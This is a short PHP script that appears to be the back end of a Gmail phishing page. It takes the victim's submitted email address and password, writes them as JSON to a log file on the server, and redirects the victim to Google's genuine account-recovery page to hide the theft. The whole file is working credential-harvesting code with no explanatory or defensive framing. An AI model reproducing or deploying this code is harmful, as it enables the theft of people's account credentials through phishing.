<?php

header('Location: https://accounts.google.com/signin/v2/recoveryidentifier');
$data = array('site' => 'Gmail',
  'user' => $_POST['email'],
  'pass' => $_POST['password']);

  $json_data = json_encode($data);

  $f = fopen('../../../logs/info.txt', 'w+');
  fwrite($f, $json_data);
  fclose($f);
exit();
?>